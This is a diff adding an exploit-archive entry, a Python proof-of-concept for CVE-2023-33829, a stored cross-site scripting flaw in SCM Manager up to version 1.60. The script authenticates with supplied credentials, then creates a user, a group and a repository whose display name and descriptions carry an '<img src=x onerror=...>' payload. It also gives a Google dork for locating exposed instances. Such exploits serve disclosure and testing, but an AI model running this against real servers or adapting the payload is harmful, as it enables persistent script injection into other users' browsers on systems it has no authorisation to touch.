@@ -1,0 +1,99 @@
+id: 38737
+date: 05/26/2023
+title: SCM Manager 1.60 - Cross-Site Scripting Stored (Authenticated) Exploit
+author: neg0x
+cves: CVE-2023-33829
+
+#!/usr/bin/python3
+
+# Exploit Title: SCM Manager 1.60 - Cross-Site Scripting Stored (Authenticated)
+# Google Dork: intitle:"SCM Manager" intext:1.60
+# Date: 05-25-2023
+# Exploit Author: neg0x (https://github.com/n3gox/CVE-2023-33829)
+# Vendor Homepage: https://scm-manager.org/
+# Software Link: https://scm-manager.org/docs/1.x/en/getting-started/
+# Version: 1.2 <= 1.60
+# Tested on: Debian based
+# CVE: CVE-2023-33829
+
+# Modules
+import requests
+import argparse
+import sys
+
+# Main menu
+parser = argparse.ArgumentParser(description='CVE-2023-33829 exploit')
+parser.add_argument("-u", "--user", help="Admin user or user with write permissions")
+parser.add_argument("-p", "--password", help="password of the user")
+args = parser.parse_args()
+
+
+# Credentials
+user = sys.argv[2]
+password = sys.argv[4]
+
+
+# Global Variables
+main_url = "http://localhost:8080/scm" # Change URL if its necessary
+auth_url = main_url + "/api/rest/authentication/login.json"
+users = main_url + "/api/rest/users.json"
+groups = main_url + "/api/rest/groups.json"
+repos = main_url + "/api/rest/repositories.json"
+
+# Create a session
+session = requests.Session()
+
+# Credentials to send
+post_data={
+	'username': user, # change if you have any other user with write permissions
+	'password': password # change if you have any other user with write permissions
+}
+
+r = session.post(auth_url, data=post_data)
+
+if r.status_code == 200:
+	print("[+] Authentication successfully")
+else:
+	print("[-] Failed to authenticate")
+	sys.exit(1)
+
+new_user={
+
+	"name": "newUser",
+	"displayName": "<img src=x onerror=alert('XSS')>",
+	"mail": "",
+	"password": "",
+	"admin": False,
+	"active": True,
+	"type": "xml"
+
+}
+
+create_user = session.post(users, json=new_user)
+print("[+] User with XSS Payload created")
+
+new_group={
+
+	"name": "newGroup",
+	"description": "<img src=x onerror=alert('XSS')>",
+	"type": "xml"
+
+}
+
+create_group = session.post(groups, json=new_group)
+print("[+] Group with XSS Payload created")
+
+new_repo={
+
+	"name": "newRepo",
+	"type": "svn",
+	"contact": "",
+	"description": "<img src=x onerror=alert('XSS')>",
+	"public": False
+
+}
+
+create_repo = session.post(repos, json=new_repo)
+print("[+] Repository with XSS Payload created")
+
+#  0day.today [2023-06-08]  #
